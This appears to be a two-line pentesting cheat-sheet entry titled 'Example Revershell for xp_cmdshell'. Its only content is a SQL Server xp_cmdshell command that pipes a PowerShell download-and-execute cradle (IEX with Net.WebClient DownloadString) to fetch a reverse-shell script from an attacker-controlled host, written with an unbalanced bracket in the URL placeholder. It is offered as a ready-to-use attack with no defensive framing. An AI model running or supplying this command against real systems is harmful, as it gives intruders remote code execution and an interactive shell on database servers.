- Example Revershell for xp_cmdshell
```
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://[your_local_ip/tcp_revershell.ps1") | powershell -noprofile'
```
